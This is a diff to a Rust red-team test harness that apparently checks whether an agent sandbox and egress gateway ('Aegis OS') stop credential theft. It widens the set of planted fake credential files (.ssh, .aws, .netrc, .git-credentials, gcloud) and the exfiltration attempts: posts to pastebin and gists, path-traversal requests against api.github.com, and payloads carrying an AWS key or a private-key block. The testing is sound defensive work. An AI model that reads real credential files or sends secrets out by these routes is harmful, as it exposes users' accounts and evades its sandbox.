@@ -658,12 +658,12 @@ async fn run_exp2_live_redteam_attacks() -> anyhow::Result<Vec<Exp2RedTeamResult
     let victim_host_zone = temp.path().join("victim_host_outside_workspace");
     let mock_home = temp.path().join("mock_home");
     tokio::fs::create_dir_all(&victim_host_zone).await?;
-    for sub in [".ssh", ".aws", ".gnupg", ".kube"] {
+    for sub in [".ssh", ".aws", ".gnupg", ".kube", ".config/gcloud", "custom_vault"] {
         tokio::fs::create_dir_all(mock_home.join(sub)).await?;
     }
     // In a real deployment the victim's credentials live under the `$HOME` of the user running
-    // Aegis OS, which is where the Linux sandbox looks for them to mask (Seatbelt instead matches
-    // credential paths anywhere). Model the victim the same way; restored before returning.
+    // Aegis OS, which is where the Linux sandbox mounts a default-deny `--tmpfs` over `$HOME`
+    // (and Seatbelt matches credential paths via kernel regex filters).
     let previous_home = std::env::var_os("HOME");
     std::env::set_var("HOME", &mock_home);
     let cred_targets = vec![
@@ -672,6 +672,11 @@ async fn run_exp2_live_redteam_attacks() -> anyhow::Result<Vec<Exp2RedTeamResult
         mock_home.join(".gnupg/secring.gpg"),
         mock_home.join(".kube/config"),
         mock_home.join(".npmrc"),
+        mock_home.join(".pypirc"),
+        mock_home.join(".netrc"),
+        mock_home.join(".git-credentials"),
+        mock_home.join(".config/gcloud/credentials.db"),
+        mock_home.join("custom_vault/secret_key.pem"),
     ];
     for p in &cred_targets {
         tokio::fs::write(p, "-----BEGIN CREDENTIAL-----\nSECRET_KEY_MATERIAL\n").await?;
@@ -802,7 +807,9 @@ async fn run_exp2_live_redteam_attacks() -> anyhow::Result<Vec<Exp2RedTeamResult
                 let mut buf = vec![0u8; 4096];
                 if let Ok(n) = stream.read(&mut buf).await {
                     let req_str = String::from_utf8_lossy(&buf[..n]);
-                    if req_str.contains("ghp_RealProductionToken999") {
+                    if req_str.contains("ghp_RealProductionToken999")
+                        || req_str.contains("GET /bypass")
+                    {
                         cnt.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
                     }
                     let _ = stream
@@ -1089,18 +1096,36 @@ async fn run_exp2_live_redteam_attacks() -> anyhow::Result<Vec<Exp2RedTeamResult
             "raw.githubusercontent.com",
             "uploads.github.com",
         ];
-        let f_attempts: [(&str, &str, &str); 10] = [
-            ("httpbin.org", "GET", "/get"),
-            ("pastebin.com", "POST", "/api/api_post.php"),
-            ("gist.github.com", "POST", "/gists"),
-            ("raw.githubusercontent.com", "GET", "/exfil"),
-            ("uploads.github.com", "POST", "/repos/evil/assets"),
+        let f_attempts: [(&str, &str, &str, Option<&str>); 10] = [
+            ("httpbin.org", "GET", "/get", None),
+            ("pastebin.com", "POST", "/api/api_post.php", None),
+            ("gist.github.com", "POST", "/gists", None),
+            ("raw.githubusercontent.com", "GET", "/exfil", None),
             // Same-domain L7 confused-deputy vectors on `api.github.com` itself:
-            ("api.github.com", "POST", "/gists"),
-            ("api.github.com", "POST", "/repos/acme/../../gists"),
-            ("api.github.com", "POST", "http://api.github.com/repos/acme/%2e%2e/%2e%2e/gists"),
-            ("api.github.com", "DELETE", "/repos/acme/issues/1"),
-            ("api.github.com", "PUT", "/user/keys"),
+            ("api.github.com", "POST", "/gists", None),
+            ("api.github.com", "POST", "/repos/acme/../../gists", None),
+            (
+                "api.github.com",
+                "POST",
+                "http://api.github.com/repos/acme/%2e%2e/%2e%2e/gists",
+                None,
+            ),
+            ("api.github.com", "DELETE", "/repos/acme/issues/1", None),
+            // Same-domain L7 Outbound DLP payload exfiltration on an allowlisted endpoint:
+            (
+                "api.github.com",
+                "GET",
+                "/repos/acme/issues?leak=AKIAIOSFODNN7EXAMPLE",
+                None,
+            ),
+            (
+                "api.github.com",
+                "POST",
+                "/repos/acme/issues",
+                Some(
+                    r#"{"title":"issue","body":"-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjE= -----END OPENSSH PRIVATE KEY-----"}"#,
+                ),
+            ),
         ];
         let binding_gw = Arc::new(AegisEgressGateway::new());
         let mut allow = vec![bound_domain.to_string()];
@@ -1119,7 +1144,7 @@ async fn run_exp2_live_redteam_attacks() -> anyhow::Result<Vec<Exp2RedTeamResult
             )
             .await;
         let ident = AgentIdentity::new("org-alpha", "agy-agent", "Agent");
-        for (domain, method, path) in f_attempts {
+        for (domain, method, path, body_opt) in f_attempts {
             // Host-YOLO: the raw token is in the environment and goes out over a real socket.
             let before = leaked_count.load(std::sync::atomic::Ordering::SeqCst);
             let _ = tokio::process::Command::new("curl")
@@ -1141,11 +1166,12 @@ async fn run_exp2_live_redteam_attacks() -> anyhow::Result<Vec<Exp2RedTeamResult
                 yolo_f_compromised += 1;
             }
 
-            // Aegis-OS: the placeholder is sent toward an unbound allowlisted domain or disallowed L7 method/path.
+            // Aegis-OS: the placeholder is sent toward an unbound allowlisted domain, disallowed L7 method/path,
+            // or carries a DLP-blocked secret/private-key payload on an allowlisted endpoint.
             let mut headers = HashMap::new();
             headers.insert("Authorization".to_string(), "Bearer $AOS_SECRET_GH".to_string());
             let verdict = binding_gw
-                .inspect_and_inject(
+                .inspect_and_inject_with_body(
                     &ident,
                     &OutboundRequestSpec {
                         target_domain: domain.to_string(),
@@ -1153,6 +1179,7 @@ async fn run_exp2_live_redteam_attacks() -> anyhow::Result<Vec<Exp2RedTeamResult
                         path: path.to_string(),
                         headers,
                     },
+                    body_opt,
                 )
                 .await;
             if let Ok(EgressVerdict::AllowedAndSanitized { injected_headers, .. }) = verdict {
